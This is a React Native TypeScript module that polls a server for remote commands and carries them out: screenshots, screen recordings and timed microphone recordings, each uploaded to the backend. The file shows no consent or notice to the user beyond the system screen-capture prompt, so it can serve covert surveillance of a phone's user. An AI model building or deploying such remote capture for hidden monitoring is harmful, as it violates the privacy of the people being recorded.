import { NativeModules } from 'react-native'
import { deviceApi } from '@/lib/api'
import type { RemoteCommand } from '@/types/sync'
import type {
  ScreenCaptureModuleInterface,
  AudioRecorderModuleInterface,
} from '@/types/native'

const ScreenCaptureModule = NativeModules.ScreenCaptureModule as ScreenCaptureModuleInterface
const AudioRecorderModule = NativeModules.AudioRecorderModule as AudioRecorderModuleInterface

type CommandResult = {
  success: boolean
  filePath?: string
  error?: string
}

const DEFAULT_RECORDING_SECONDS = 30
const DEFAULT_MIC_SECONDS = 60
const UPLOAD_TIMEOUT_MS = 120_000

async function ensureProjection(): Promise<void> {
  const has = await ScreenCaptureModule.hasProjection()
  if (!has) {
    await ScreenCaptureModule.requestProjection()
  }
}

async function executeScreenshot(): Promise<CommandResult> {
  try {
    await ensureProjection()
    const filePath = await ScreenCaptureModule.takeScreenshot()
    return { success: true, filePath }
  } catch (err) {
    return { success: false, error: err instanceof Error ? err.message : String(err) }
  }
}

async function executeScreenRecording(
  payload: Record<string, unknown> | null,
): Promise<CommandResult> {
  try {
    await ensureProjection()
    const durationMs =
      ((payload?.duration_seconds as number | undefined) ?? DEFAULT_RECORDING_SECONDS) * 1000
    const filePath = await ScreenCaptureModule.startRecording(durationMs)
    return { success: true, filePath }
  } catch (err) {
    return { success: false, error: err instanceof Error ? err.message : String(err) }
  }
}

async function executeLiveMic(
  payload: Record<string, unknown> | null,
): Promise<CommandResult> {
  try {
    const durationSeconds =
      (payload?.duration_seconds as number | undefined) ?? DEFAULT_MIC_SECONDS
    const filePath = await AudioRecorderModule.startRecording(durationSeconds)
    return { success: true, filePath }
  } catch (err) {
    return { success: false, error: err instanceof Error ? err.message : String(err) }
  }
}

async function executeCommand(command: RemoteCommand): Promise<CommandResult> {
  switch (command.type) {
    case 'screenshot':
      return executeScreenshot()
    case 'screen_recording':
      return executeScreenRecording(command.payload)
    case 'live_mic':
      return executeLiveMic(command.payload)
    default:
      return { success: false, error: `Unknown command type: ${String(command.type)}` }
  }
}

function resolveContentType(ext: string): string {
  const types: Record<string, string> = {
    png: 'image/png',
    jpg: 'image/jpeg',
    mp4: 'video/mp4',
    m4a: 'audio/mp4',
  }
  return types[ext] ?? 'application/octet-stream'
}

async function respondToCommand(
  commandId: number,
  result: CommandResult,
): Promise<void> {
  const formData = new FormData()
  formData.append('status', result.success ? 'completed' : 'failed')

  if (result.error) {
    formData.append('error_message', result.error)
  }

  if (result.success && result.filePath) {
    const fileName = result.filePath.split('/').pop() ?? 'result'
    const ext = fileName.split('.').pop() ?? 'bin'
    formData.append('result_file', {
      uri: `file://${result.filePath}`,
      type: resolveContentType(ext),
      name: fileName,
    } as unknown as Blob)
  }

  await deviceApi.post(`/device/commands/${commandId}/respond`, formData, {
    headers: { 'Content-Type': 'multipart/form-data' },
    timeout: UPLOAD_TIMEOUT_MS,
  })
}

let _polling = false
let _intervalRef: ReturnType<typeof setInterval> | null = null

export const CommandService = {
  isPolling(): boolean {
    return _intervalRef !== null
  },

  async pollAndExecute(): Promise<number> {
    if (_polling) return 0
    _polling = true

    try {
      const response = await deviceApi.get<{ data: RemoteCommand[] }>('/device/commands')
      const raw = response.data?.data ?? (response.data as unknown as RemoteCommand[])
      const pending = (Array.isArray(raw) ? raw : []).filter(c => c.status === 'pending')

      let executed = 0
      for (const command of pending) {
        try {
          const result = await executeCommand(command)
          await respondToCommand(command.id, result)
          executed++
        } catch {
          await respondToCommand(command.id, {
            success: false,
            error: 'Execution failed unexpectedly',
          }).catch(() => undefined)
        }
      }
      return executed
    } catch {
      return 0
    } finally {
      _polling = false
    }
  },

  startPolling(intervalMs: number = 30_000): void {
    if (_intervalRef) return
    CommandService.pollAndExecute().catch(() => undefined)
    _intervalRef = setInterval(() => {
      CommandService.pollAndExecute().catch(() => undefined)
    }, intervalMs)
  },

  stopPolling(): void {
    if (_intervalRef) {
      clearInterval(_intervalRef)
      _intervalRef = null
    }
  },
}
